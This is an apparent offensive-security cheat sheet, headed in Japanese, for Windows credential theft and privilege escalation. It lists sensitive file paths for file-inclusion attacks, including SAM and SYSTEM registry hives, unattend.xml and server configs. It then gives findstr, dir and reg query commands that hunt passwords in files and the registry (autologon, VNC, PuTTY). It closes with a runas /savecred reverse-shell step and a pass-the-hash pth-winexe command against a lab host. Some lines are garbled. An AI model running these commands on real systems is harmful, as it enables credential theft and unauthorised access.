# 重要ファイル一覧

- `C:/Users/Administrator/NTUser.dat`
- `C:/Documents and Settings/Administrator/NTUser.dat`
- `C:/apache/logs/access.log`
- `C:/apache/logs/error.log`
- `C:/apache/php/php.ini`
- `C:/boot.ini`
- `C:/inetpub/wwwroot/global.asa`
- `C:/MySQL/data/hostname.err`
- `C:/MySQL/data/mysql.err`
- `C:/MySQL/data/mysql.log`
- `C:/MySQL/my.cnf`
- `C:/MySQL/my.ini`
- `C:/php4/php.ini`
- `C:/php5/php.ini`
- `C:/php/php.ini`
- `C:/Program Files/Apache Group/Apache2/conf/httpd.conf`
- `C:/Program Files/Apache Group/Apache/conf/httpd.conf`
- `C:/Program Files/Apache Group/Apache/logs/access.log`
- `C:/Program Files/Apache Group/Apache/logs/error.log`
- `C:/Program Files/FileZilla Server/FileZilla Server.xml`
- `C:/Program Files/MySQL/data/hostname.err`
- `C:/Program Files/MySQL/data/mysql-bin.log`
- `C:/Program Files/MySQL/data/mysql.err`
- `C:/Program Files/MySQL/data/mysql.log`
- `C:/Program Files/MySQL/my.ini`
- `C:/Program Files/MySQL/my.cnf`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err`
- `C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log`
- `C:/Program Files/MySQL/MySQL Server 5.0/my.cnf`
- `C:/Program Files/MySQL/MySQL Server 5.0/my.ini`
- `C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf`
- `C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf`
- `C:/Program Files (x86)/Apache Group/Apache/conf/access.log`
- `C:/Program Files (x86)/Apache Group/Apache/conf/error.log`
- `C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml`
- `C:/Program Files (x86)/xampp/apache/conf/httpd.conf`
- `C:/WINDOWS/php.ini`
- `C:/WINDOWS/Repair/SAM`
- `C:/Windows/repair/system`
- `C:/Windows/repair/software`
- `C:/Windows/repair/security`
- `C:/WINDOWS/System32/drivers/etc/hosts`
- `C:/Windows/win.ini`
- `C:/WINNT/php.ini`
- `C:/WINNT/win.ini`
- `C:/xampp/apache/bin/php.ini`
- `C:/xampp/apache/logs/access.log`
- `C:/xampp/apache/logs/error.log`
- `C:/Windows/Panther/Unattend/Unattended.xml`
- `C:/Windows/Panther/Unattended.xml`
- `C:/Windows/debug/NetSetup.log`
- `C:/Windows/system32/config/AppEvent.Evt`
- `C:/Windows/system32/config/SecEvent.Evt`
- `C:/Windows/system32/config/default.sav`
- `C:/Windows/system32/config/security.sav`
- `C:/Windows/system32/config/software.sav`
- `C:/Windows/system32/config/system.sav`
- `C:/Windows/system32/config/regback/default`
- `C:/Windows/system32/config/regback/sam`
- `C:/Windows/system32/config/regback/security`
- `C:/Windows/system32/config/regback/system`
- `C:/Windows/system32/config/regback/software`
- `C:/Program Files/MySQL/MySQL Server 5.1/my.ini`
- `C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml`
- `C:/Windows/System32/inetsrv/config/applicationHost.config`
- `C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log`
---

## Passwords
### Sensitive files
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
Findstr /si password *.config 
findstr /si pass/pwd *.ini  
dir /s *pass*== *cred*== *vnc*== *.config*inall files  
findstr /spin "password"*.*findstr /spin "password"*.*

### Config Files
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  

dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini

### Registory
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

#### VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  

#### Windows autologin  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

#### SNMP Paramters  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

#### Putty  
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  

#### Search for password in registry  
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s

### RunAs - Savedcreds
cmdkey /list 
保存されている資格情報を表示し、任意のオプション ユーザーを検索します

runas /savecred /user:admin C:\Temp\reverse.exe
リバースシェルを転送します

### Pass the Hash
#何らかの手段でハッシュを取得する場合は、psexec、smbexecを使用し、別のユーザーとしてシェルを取得します。
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe


